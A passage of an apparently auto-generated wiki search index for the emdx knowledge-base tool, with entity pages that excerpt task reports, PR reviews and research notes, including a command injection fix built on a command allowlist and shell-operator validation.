<p>...<code>SAFE_DISCOVERY_COMMANDS</code> frozenset (allowlist of safe shell commands)</p> </li> <li>Removed <code>_validate_discovery_command()</code> function (command parsing and allowlist validation)</li> <li>Removed <code>_run_discovery()</code> function (shell command execution and output parsing)</li> <li> <p>Removed <code>--each</code> and <code>--do</code>...</p> </li> <li> <p>#6468 Security Fix Implementation for EMDX Delegate Command   Section: 2. Input Validation</p> <p>Added <code>_validate_discovery_command()</code> function that:</p> </li> <li>Uses <code>shlex.split()</code> for safe command parsing</li> <li>Extracts base command name (handles absolute paths like <code>/usr/bin/fd</code>)</li> <li> <p>Validates command against...</p> </li> <li> <p>#6276 Delegate: DEBT-1: Fix command injection vulnerability in emdx/commands   Section: emdx/commands/delegate.py</p> <ol> <li>Added <code>_validate_discovery_command()</code> function that:</li> </ol> </li> <li>Parses commands using <code>shlex.split()</code> (prevents shell metacharacter injection)</li> <li> <p>Extracts the base command name (handles full paths like `/...</p> </li> <li> <p>#6272 Delegate: Document #6230 (Delegate: Audit SECURITY DEBT in the emdx pr [36/37]   Section: Fix Implementation</p> </li> <li>Parses command with <code>shlex.split()</code> for safe tokenization</li> <li>Extracts base command name (handles absolute paths like <code>/usr/bin/fd</code>)</li> <li> <p>Validates against a...</p> </li> <li> <p>#6270 Security Fix: Command Injection in delegate --each   Section: 1. Fixed Command Injection in <code>_run_discovery()</code> (CRITICAL)</p> <p>...OMMANDS<code>allowlist:</code>fd<code>,</code>find<code>,</code>git<code>,</code>ls<code>,</code>rg<code>,</code>grep<code>,</code>eza<code>,</code>exa`</p> </li> <li>Added <code>_validate_discovery_command()</code> function that:</li> <li>Parses command with <code>shlex.split()</code> </li> <li>Validates base command is in allowlist</li> <li>Checks for dangerous shell metacharacters (<code>;|&amp;$\\</code>\\`)</li> <li> <p>Chan...</p> </li> <li> <p>#6267 Delegate: Document #6230 (Delegate: Audit SECURITY DEBT in the emdx pr [32/37]   Section: Changes Made</p> <ul> <li><code>emdx/commands/delegate.py</code>: Added <code>SAFE_DISCOVERY_COMMANDS</code> allowlist, <code>DANGEROUS_PATTERNS</code> regex, and <code>_validate_discovery_command()</code> validation function</li> </ul> </li> <li> <p><code>tests/test_commands_delegate.py</code>: Added 32 comprehensive security tests</p> </li> <li> <p>#6263 Delegate: Document #6230 (Delegate: Audit SECURITY DEBT in the emdx pr [28/37]   Section: 1. Command Injection Fix (emdx/commands/delegate.py)</p> <p>Added <code>_validate_discovery_command()</code> function that:</p> </li> <li>Defines an allowlist of safe commands: <code>fd</code>, <code>find</code>, <code>git</code>, <code>ls</code>, <code>rg</code>, <code>exa</code>, <code>eza</code>, <code>tree</code></li> <li> <p>Rejects dangerous shell metacharacters before parsin...</p> </li> <li> <p>#6260 Delegate: Document #6230 (Delegate: Audit SECURITY DEBT in the emdx pr [26/37]   Section: Fix Applied</p> <ol> <li>Added <code>_validate_discovery_command()</code> function - Multi-layer validation:</li> </ol> </li> <li>Rejects shell operators (<code>|</code>, <code>;</code>, <code>&amp;</code>, <code>$(</code>, <code>`</code>, <code>&gt;</code>, <code>&lt;</code>, <code>||</code>, <code>&amp;&amp;</code>)</li> <li> <p>Uses <code>shlex.split()</code> to parse commands s...</p> </li> <li> <p>#6255 Delegate: Document #6230 (Delegate: Audit SECURITY DEBT in the emdx pr [20/37]   Section: Code Changes (<code>emdx/commands/delegate.py</code>)</p> <ol> <li>Added <code>_validate_discovery_command()</code> function:</li> </ol> </li> <li>Uses <code>shlex.split()</code> to safely parse commands</li> <li>Validates base command against allowlist</li> <li> <p>Restricts git to safe subcommands only</p> </li> <li> <p>#6243 Delegate: Fix command injection in --each flag   Section: The Fix</p> <ol> <li>Added <code>_validate_discovery_command()</code> function - Validates the command before execution:</li> </ol> </li> <li>Uses <code>shlex.split()</code> to safely parse the command</li> <li> <p>Extracts the base command name (handles full paths l...</p> </li> <li> <p>#6240 Delegate: Document #6230 (Delegate: Audit SECURITY DEBT in the emdx pr [4/37]   Section: Fix Applied</p> </li> <li><code>emdx/commands/delegate.py</code>: Added <code>_validate_discovery_command()</code> and allowlist</li> <li> <p><code>tests/test_commands_delegate.py</code>: Added 19 security tests</p> </li> <li> <p>#6238 Delegate: Document #6230 (Delegate: Audit SECURITY DEBT in the emdx pr [6/37]   Section: Files Changed</p> <ol> <li>emdx/commands/delegate.py</li> </ol> </li> <li>Added <code>shlex</code> import</li> <li>Added <code>SAFE_DISCOVERY_COMMANDS</code> frozenset allowlist</li> <li>Added <code>_validate_discovery_command()</code> function for security validation</li> <li>Modified <code>_run_discovery()</code> to use the new validation</li> </ul>"},{"location":"entities/validatediscoverycommand/#2-validation-function","title":"2. Validation Function","text":"<p>New <code>_validate_discovery_command()</code> function:</p>"},{"location":"entities/validatediscoverycommand/#files-changed","title":"Files Changed","text":""},{"location":"entities/validatediscoverycommand/#related-entities","title":"Related Entities","text":"<ul> <li><code>added</code>_validate_discovery_command()<code>function</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (4 shared docs, PMI=6.1)</li> <li><code>pr #510</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.1)</li> <li><code>testvalidatediscoverycommand</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (4 shared docs, PMI=5.8)</li> <li><code>safe_discovery_commands</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (7 shared docs, PMI=5.8)</li> <li><code>shlex</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=5.7)</li> <li><code>/usr/bin/fd</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (4 shared docs, PMI=5.6)</li> <li><code>risk assessment update</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.6)</li> <li><code>git ls-files</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.6)</li> <li><code>bash</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.6)</li> <li><code>after (secure):</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.6)</li> </ul>"},{"location":"entities/verbose/","title":"--verbose","text":"<p>Type: tech_term | Mentioned in: 15 documents | First seen: 2026-02-14</p>"},{"location":"entities/verbose/#documents-15","title":"Documents (15)","text":"<ul> <li> <p>#6861 Delegate: FEAT-33 (Issue #1245): Add editorial prompt injection for wi [3/4]   Section: Changes made:</p> <ol> <li>Verbose topic listing (<code>emdx/commands/maintain.py</code>): Added <code>--verbose</code> flag to <code>wiki topics</code> that shows saved topics with their editorial prompts in a table.</li> </ol> </li> <li> <p>#6860 Delegate: FEAT-34 (Issue #1246): Add per-topic model override for wiki [4/4]   Section: Changes made:</p> <ol> <li>Verbose topics display (<code>emdx/commands/maintain.py</code>): Added <code>--verbose</code> flag to <code>wiki topics</code> showing the Model Override column; <code>wiki status</code> also shows a Model column when any topic has an override</li> </ol> </li> <li> <p>#6841 Delegate: Add agent-friendly command aliases to reduce agent confusion</p> <p>...()<code>function that finds the first positional argument (skipping global flags like</code>--verbose`) and replaces it with the alias expansion via slice assignment</p> </li> <li> <p>Wired it into <code>run()</code> before the existing <code>_rewrite_tag_shorthand</code> call</p> </li> <li> <p>#6758 Delegate: Research how to get progress/status information from a runni   Section: 7. Claude CLI Flags for Budget/Progress</p> <p>...| | <code>--max-turns</code> | Limits agentic turns \u2014 could infer \"turn 5 of 10\" if set | | <code>--verbose</code> | Required for stream-json to emit tool events | | <code>--include-partial-messages</code> | More granular streaming (text token by token) |</p> </li> <li> <p>#6592 Delegate: Research the first-5-minutes experience after 'pip install e [4/4]   Section: When DB doesn't exist yet</p> <p>Option 1: Silent auto-init (current, but fix the noise)</p> </li> <li>Create DB on first write</li> <li>Suppress migration output unless --verbose</li> <li> <p>Show only \"Created knowledge base at ~/.config/emdx/knowledge.db\"</p> </li> <li> <p>#6546 Delegate Enhancement Gameplans [synthesis]   Section: Key Findings by Feature</p> <p>Output Design: Action on stdout (for Claude), reasoning on stderr (for humans). Supports <code>--json</code> and <code>--verbose</code>.</p> </li> <li> <p>#6545 Delegate Enhancement Gameplans [1/5]   Section: CLI Signature</p> <p>Options:   --json           Output as JSON (for programmatic use)   --verbose, -v    Show reasoning on stderr   --quiet, -q      Suppress stderr output entirely   --help           Show this message and exit ```</p> </li> <li> <p>#6524 Delegate: FEAT-5 Smart Priming Implementation   Section: Phase 2: Key Docs in Prime</p> <ul> <li>Query: <code>SELECT id, title, access_count FROM documents WHERE deleted_at IS NULL AND access_count &gt; 0 ORDER BY access_count DESC LIMIT ?</code></li> </ul> </li> <li>Display format: <code>#ID \"Title\" \u2014 N views</code></li> <li> <p>Only shown in <code>--verbose</code> mode</p> </li> <li> <p>#6522 Gameplan: FEAT-5 Smart Priming Gaps   Section: Remaining Work</p> <p>...t DESC LIMIT 5`</p> </li> <li>Display in prime output: <code>#ID \"Title\" \u2014 N views</code></li> <li> <p>Only show in <code>--verbose</code> mode</p> </li> <li> <p>#6520 Delegate: Analyze FEAT-5: Re-implement smart priming (PR #446). The or [1/2]   Section: \u26a0\ufe0f PARTIAL (Exists but Different)</p> <p>...tput could be tightened | | Verbose Mode | <code>--smart</code> flag for extra context | <code>--verbose</code> flag exists | Different flag name, similar purpose |</p> </li> <li> <p>#6519 Delegate: Analyze FEAT-7: Re-implement ask-kb improvements (PR #453).  [2/2]   Section: <code>emdx/commands/ask.py</code> (Current State)</p> <p>...rce keyword search) | \u2705 Exists | | <code>--sources/--no-sources</code> toggle | \u2705 Exists | | <code>--verbose</code> debug mode | \u2705 Exists | | <code>emdx ai context</code> (pipe to claude) | \u2705 Exists | | <code>emdx ai index</code> (build embeddings) | \u2705 Exists | | <code>emdx ai search</code> (semantic search) | \u2705...</p> </li> <li> <p>#6314 Delegate: analysis,architecture,active [13/15]   Section: Core Architecture Layers</p> <p>...nd rewriting**: <code>emdx tag 42 active</code> \u2192 <code>emdx tag add 42 active</code></p> </li> <li> <p>Global options: <code>--verbose</code>, <code>--quiet</code>, <code>--db-url</code>, <code>--safe-mode</code></p> </li> <li> <p>#6308 Delegate: Analyze API SURFACE &amp; CONCISENESS across emdx/ (exclude ui/  [10/15]   Section: 1. Command Redundancy - HIGH IMPACT</p> <p>Status/Prime overlap:</p> </li> <li><code>emdx status</code> and <code>emdx prime</code> have significant overlap - both show tasks, cascade queue, and execution state</li> <li> <p>Suggestion: Merge into single command with <code>--json</code>/<code>--verbose</code> flags for different use cases</p> </li> <li> <p>#6262 Delegate: Audit API/INTERFACE DEBT in the emdx CLI [3/14]   Section: Changes Made</p> </li> <li>Silent exceptions in <code>_safe_update_task()</code> and <code>_safe_update_execution()</code> now output to stderr when <code>--verbose</code> is set</li> <li> <p>Module-level `...</p> </li> <li> <p>#6226 Delegate: Audit API/INTERFACE DEBT in the emdx CLI: Check all CLI comm [3/14]   Section: CRITICAL SEVERITY (Breaking Contract Risks)</p> <p>...to users; debugging impossible. Recommendation: Log warnings at minimum; add <code>--verbose</code> flag to surface these errors.</p> </li> </ul>"},{"location":"entities/verbose/#2-added-verbose-flag-to-delegate-issue-2","title":"2. Added --verbose Flag to Delegate (Issue #2)","text":""},{"location":"entities/verbose/#related-entities","title":"Related Entities","text":"<ul> <li><code>git log --oneline -3</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=5.8)</li> <li><code>git branch --show-current</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=5.8)</li> <li><code>#id \"title\" \u2014 n views</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=5.8)</li> <li><code>wiki topics</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.8)</li> <li><code>scope estimate</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.8)</li> <li><code>output design:</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.8)</li> <li><code>migration 051</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.8)</li> <li><code>gh pr list --state=open --limit=5 --json number,title,headrefname</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.8)</li> <li><code>gap analysis</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.8)</li> <li><code>emdx/commands/next.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.8)</li> </ul>"},{"location":"entities/verdict/","title":"verdict","text":"<p>Type: heading | Mentioned in: 14 documents | First seen: 2026-02-13</p>"},{"location":"entities/verdict/#documents-14","title":"Documents (14)","text":"<ul> <li>#6862 Delegate: Audit README.md: Read the full README.md and check every CLI [1/3] <p>Low priority \u2014 the README shows the core workflow. ### Summary</p> </li> </ul> # Line(s) Severity Issue 1 3 Low Version badge hardcoded (correct now, stale on release) 2 142-150 Medium \"More feature... <ul> <li>#6530 Delegate: Review GitHub PR #651 using 'gh pr view 651' and 'gh pr diff [2/4] <p>If <code>--chain</code> was heavily used, consider keeping it as a simpler wrapper that calls tasks sequentially (without all the cascade infrastructure). ## Verdict</p> </li> </ul> <p>Overall: GOOD PR \u2705</p> <p>This is a well-executed removal of a large, complex subsystem. The cle...</p> <ul> <li>#6528 Delegate: Review GitHub PR #650 using 'gh pr view 650' and 'gh pr diff [3/4] <p>Very Long Questions: Not explicitly handled - could exceed context limits</p> </li> <li>Concurrent Questions: <code>is_asking</code> flag prevents concurrent calls - good</li> </ul>"},{"location":"entities/verdict/#testing-concerns","title":"Testing Concerns","text":"<ul> <li>No tests included in the PR for the new QA functionality</li> <li> <p>The strea...</p> </li> <li> <p>#6527 Delegate: Review GitHub PR #649 using 'gh pr view 649' and 'gh pr diff [4/4]</p> <p>Add <code>--force</code> flag for overwrite scenario</p> </li> <li>Document in CLI help that <code>--done</code> transitions task to \"done\" status</li> </ul>"},{"location":"entities/verdict/#verdict_1","title":"Verdict","text":"<p>Good PR overall. The feature is well-implemented with proper validation and good UX. The main gap is missing te...</p> <ul> <li> <p>#6403 Bug Fix PR Reviews [1/6]   Section: Edge Cases Analysis</p> </li> <li> <p>#6152 PR Review: #454 Semantic Find Upgrade</p> <p>This is fine but inconsistent with function ordering. ## Test Plan Status From PR description:</p> </li> <li>[x] <code>emdx find \"gameplan\" --mode keyword</code> - works  </li> <li>[x] <code>emdx find \"authentication patterns\"</code> - works</li> <li>[x] <code>emdx ai stats</code> - shows chunk count</li> <li> <p>[x] `...</p> </li> <li> <p>#6150 Delegate: Review PR #448 (Contextual Save). Run: gh pr diff 448. Check [2/7]</p> </li> <li><code>format_check_output()</code> has f-string with <code>{{}}</code> that could be clearer</li> <li>Some duplicate code between <code>check</code> command output and <code>format_check_output()</code></li> </ul>"},{"location":"entities/verdict/#verdict_2","title":"Verdict","text":"<p>APPROVE - The fix is correct, the validation is appropriate, and edge cases are handled properly. The return value now accurately reflects database operation success.</p>"},{"location":"entities/verdict/#minor-nits","title":"Minor Nits","text":""},{"location":"entities/verdict/#test-coverage","title":"Test Coverage","text":"<p>MISSING: No unit tests added. The PR checkbox says tests p...</p> <ul> <li> <p>#6148 Delegate: Review PR #449 (Dream Journal). Run: gh pr diff 449. Check c [3/7]   Section: Gameplan Alignment (vs #6101)</p> <p>Verdict: Matches gameplan accurately. All core requirements implemented; stretch goal (contradiction detection) correctly deferred.</p> </li> <li> <p>#6146 Delegate: Review PR #446 (Smart Priming). Run: gh pr diff 446. Check c [1/7]</p> <p>SHOULD: Verify DB column name <code>accessed_at</code> vs <code>last_accessed_at</code> compatibility</p> </li> <li>COULD: Consider refactoring <code>_get_recent_docs()</code> and <code>_get_recent_activity()</code> to share logic</li> </ul>"},{"location":"entities/verdict/#verdict_3","title":"Verdict","text":"<p>Approve with conditions: Code quality is good, ma...</p> <ul> <li>#6147 Delegate: Review PR #452 (Auto-Linking). Run: gh pr diff 452. Check co [5/7] </li> </ul> Area Coverage CLI commands (links, link, link-stats) \u274c None LinkingService... <ul> <li> <p>#6497 None Type Analysis [6/7]   Section: ACTUALLY UNNECESSARY <code>| None</code> Annotations</p> <p>...,     documents: list[dict[str, Any]],     topic: str | None = None,     ... <code>`` **Verdict**: **NECESSARY** \u2014</code>topic<code>can legitimately be</code>None<code>and is checked with</code>if topic:`.</p> </li> <li> <p>#6498 None Type Analysis [4/7]   Section: 1. <code>emdx/models/types.py</code> (TypedDict definitions)</p> <p>Verdict: All correct.</p> </li> <li> <p>#6437 Any/None typing audit [synthesis]   Section: Patterns of Any Usage</p> <ol> <li>SQL Parameter Lists (8 occurrences) - <code>params: list[Any]</code></li> </ol> </li> <li>Used for mixed <code>str | int | None</code> SQL parameters</li> <li> <p>Verdict: Replace with <code>list[str | int | None]</code> or create type alias <code>SqlParams</code></p> </li> <li> <p>#6384 Delegate: Think critically about the strategy recommendations in doc # [4/4]   Section: 1. Identity Shift: \"Agent Workspace\" vs. \"Knowledge Base First\"</p> <p>Verdict: The strategy is probably right directionally, but the framing should keep the KB central. \"Agent-accessible knowledge base\" might be more accurate than \"agent workspace.\"</p> </li> </ul>"},{"location":"entities/verdict/#i-p4-minor-unused-import","title":"\u2139\ufe0f P4: Minor \u2014 unused import","text":"<p><code>Progress</code> imported but spinner used instead of progress bar with known total. ## Test Coverage Assessment</p>"},{"location":"entities/verdict/#related-entities","title":"Related Entities","text":"<ul> <li><code>\ud83d\udd0d edge cases</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.9)</li> <li><code>gameplan alignment</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.9)</li> <li><code>code quality assessment</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (5 shared docs, PMI=5.7)</li> <li><code>gameplan requirement</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (4 shared docs, PMI=5.6)</li> <li><code>author:</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=5.5)</li> <li><code>hybrid_search.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.3)</li> <li><code>correct</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.3)</li> <li><code>strengths</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (5 shared docs, PMI=5.1)</li> <li><code>\u2705 strengths</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=4.9)</li> <li><code>return types</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=4.9)</li> </ul>"},{"location":"entities/view/","title":"view","text":"<p>Type: heading | Mentioned in: 9 documents | First seen: 2025-07-07</p>"},{"location":"entities/view/#documents-9","title":"Documents (9)","text":"<ul> <li>#276 CLAUDE-KNOWLEDGE-SYSTEM-DESIGN   Section: Claude Knowledge Management System Design <p>...ude-Aware** - Optimized for copy/paste workflows</p> </li> <li>Human-Friendly - Beautiful viewing with mdcat</li> <li> <p>Scale-Ready - Design for thousands of documents</p> </li> <li> <p>#6693 Delegate: Research UX patterns for surfacing multi-method document lin [4/4]   Section: Problem Summary</p> <p>Current display surfaces are all flat/unranked:</p> </li> <li><code>emdx view --links</code> \u2192 flat Rich table, all methods intermixed, sorted by <code>similarity_score DESC</code></li> <li><code>_print_related_docs()</code> in view header \u2192 dumps ALL links inline</li> <li> <p><code>--json</code> ou...</p> </li> <li> <p>#6502 None Type Analysis [1/7]   Section: emdx/commands/core.py</p> </li> </ul> <pre><code>@app.command()\ndef view(\n    identifier: str = typer.Argument(..., help=\"Document ID or title\"),\n    ...\n)\n</code></pre> <p>Verdict: N/A \u2014 No <code>| None</code> annotations in this function.</p> <ul> <li>#6398 Delegate synthesis [synthesis]   Section: 3. Critical Missing Features <p>...ouping by session/topic</p> </li> <li>Quality/confidence signals on agent outputs</li> <li> <p>Diff/delta views for document evolution</p> </li> <li> <p>#6385 Delegate: Analyze EMDX's actual usage patterns to determine what's rea [2/4]   Section: 1. Commands Analysis by LOC and Value</p> <p>...gned, heavily used. | | core.py | 875 | ESSENTIAL - CRUD operations (save, view, edit, delete, find, list, recent). Bread and butter of the knowledge base. | | tasks.py | 389 | VALUABLE - Work queue for Claude sessions. Simple, focused,...</p> </li> <li> <p>#6264 Delegate: API/Interface Debt Fix - Help Text and Silent Failures   Section: Summary</p> <p>...andling is actually well-designed - commands that accept either ID or title (like <code>view</code>, <code>edit</code>, <code>delete</code>) intentionally use <code>str</code> or <code>Union[str, int]</code> to support both lookup methods. This is documented behavior and NOT an inconsistency.</p> </li> <li> <p>#267 Claude Implementation Comparison   Section: \ud83d\udcca Feature Comparison Matrix</p> <p>...from base | \u274c | \u274c | | find | \u2705 Basic search | \u2705 Optimized search | \u274c | \u274c | | view | \u2705 By ID/title/project | \u2705 Inherits | \u274c | \u2705 By ID/name | | list | \u2705 All docs | \u274c | \u274c | \u2705 All docs | | recent | \u2705 By access time | \u2705 Inherits | \u274c | \u2705 By da...</p> </li> <li> <p>#277 CLAUDE-KNOWLEDGE-MVP   Section: What We're Building (Keep It Simple!)</p> <ol> <li>Save: <code>claude-save &lt;file&gt;</code> or <code>claude-clip</code> (from clipboard)</li> </ol> </li> <li>Find: <code>claude-find &lt;search&gt;</code> or <code>claude-recent</code> </li> <li>View: <code>claude-view &lt;id&gt;</code> with tab completion</li> </ul>"},{"location":"entities/view/#typer-command-view-lines-772-852","title":"Typer Command: <code>view</code> (lines 772-852)","text":""},{"location":"entities/view/#related-entities","title":"Related Entities","text":"<ul> <li><code>verdict: necessary (both)</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.6)</li> <li><code>verdict: necessary (both param and return)</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.6)</li> <li><code>verdict: n/a</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.6)</li> <li><code>verdict: both necessary</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.6)</li> <li><code>typer command:</code>view<code>(lines 772-852)</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.6)</li> <li><code>typer command:</code>save<code>(lines 186-337)</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.6)</li> <li><code>typer command:</code>find<code>(lines 340-551)</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.6)</li> <li><code>typer command:</code>edit<code>(lines 928-1043)</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.6)</li> <li><code>typer command:</code>delegate<code>(lines 983-1331)</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.6)</li> <li><code>typer command</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.6)</li> </ul>"},{"location":"entities/wiki-generation/","title":"wiki generation","text":"<p>Type: proper_noun | Mentioned in: 15 documents | First seen: 2026-02-22</p>"},{"location":"entities/wiki-generation/#documents-15","title":"Documents (15)","text":"<ul> <li> <p>#6815 Delegate: list</p> <p>...| | FEAT-17 | Add section toggle keybindings to unified dashboard | | #1115 | Auto-Wiki Generation | | #1213 | Clickable source references in QA answers | | DOC-6 | Update cli-api.md with new task commands | | DOC-7 | Document delegate --json flag in cli-api.md |...</p> </li> <li> <p>#6783 Delegate: list [1/3]   Section: Tasks (17 total)</p> <p>...AT-25 | Wiki CLI commands (generate, status, cost, list, preview) | | #1115 | Auto-Wiki Generation | | FEAT-17 | Add section toggle keybindings to unified dashboard | | TUI-17 | QA copy and re-ask keybindings | | TUI-16 | Clickable source references in QA answers...</p> </li> <li> <p>#6768 Wiki Generation Architecture Research [4/5]</p> <p>All four research areas are now comprehensively covered. Here's a summary of everything saved to the knowledge base:</p> </li> </ul>"},{"location":"entities/wiki-generation/#research-complete-academic-tools-for-wiki-generation","title":"Research Complete \u2014 Academic Tools for Wiki Generation","text":"<p>All findings are saved to emdx (docs #6739-6765). Here's what was co...</p> <ul> <li>#6763 Wiki Generation Architecture Research [3/5] <p>Publishing:** Next.js static site with three-column layout, permanent ID-based URLs, and per-hierarchy publish controls. ## Patterns Most Relevant for Auto-Wiki Generation</p> </li> </ul> <p>The synthesis identified these as highest-value for emdx:</p> <p>| Pattern | Source...</p> <ul> <li>#6762 Wiki Generation Architecture Research [1/5] <p>Saved as #6761. Here's the complete research summary:</p> </li> </ul>"},{"location":"entities/wiki-generation/#obsidian-publish-wiki-generation-ux-research","title":"Obsidian Publish &amp; Wiki Generation UX Research","text":""},{"location":"entities/wiki-generation/#1-wikilinks-how-automatic-linking-works","title":"1. Wikilinks \u2014 How Automatic Linking Works","text":"<p>Resolution algorithm (3-tier): exact filename (case-insensitive) \u2192 normalized match (...</p> <ul> <li>#6761 Obsidian Publish and Wiki Generation UX Research   Section: 1. Wikilinks: How Automatic Linking Works </li> <li>First-occurrence linking is the universal standard (Wikipedia, all Obsidian plugins agree)</li> <li> <p>Alias/synonym support multiplies matching recall dramatically...</p> </li> <li> <p>#6759 Wiki Generation Architecture: GitBook + Dendron Research [2/2]</p> <p>Publishing Pipeline</p> </li> </ul> <p>Next.js-based static site generator (<code>@dendronhq/nextjs-template</code>):</p> <ul> <li>Three-column layout: collapsible tree nav (left), rendered content (center), auto-TOC (right)</li> <li>Permanent ID-based URLs \u2014 never break on rename</li> <li> <p>...</p> </li> <li> <p>#6752 Academic Tool Research for Wiki Generation [synthesis]</p> </li> </ul>"},{"location":"entities/wiki-generation/#lessons-for-auto-wiki-generation","title":"Lessons for Auto-Wiki Generation","text":""},{"location":"entities/wiki-generation/#academic-tool-research-for-wiki-generation-synthesis","title":"Academic Tool Research for Wiki Generation \u2014 Synthesis","text":""},{"location":"entities/wiki-generation/#key-findings-across-all-four-research-areas","title":"Key Findings Across All Four Research Areas","text":""},{"location":"entities/wiki-generation/#1-summarization-semantic-scholar-tldr","title":"1. Summarization (Semantic Scholar TLDR)","text":"<p>The standout finding is that extreme compression (10:1) produces better summaries than moderate...</p> <ul> <li> <p>#6741 Academic Tool Research for Wiki Generation [1/4]</p> <p>Generic</p> </li> <li> <p>Extreme compression (~20 words) forces a judgment call \u2014 no room for filler</p> </li> <li>Multi-target training (author-written + expert TLDRs) teaches different perspectives on 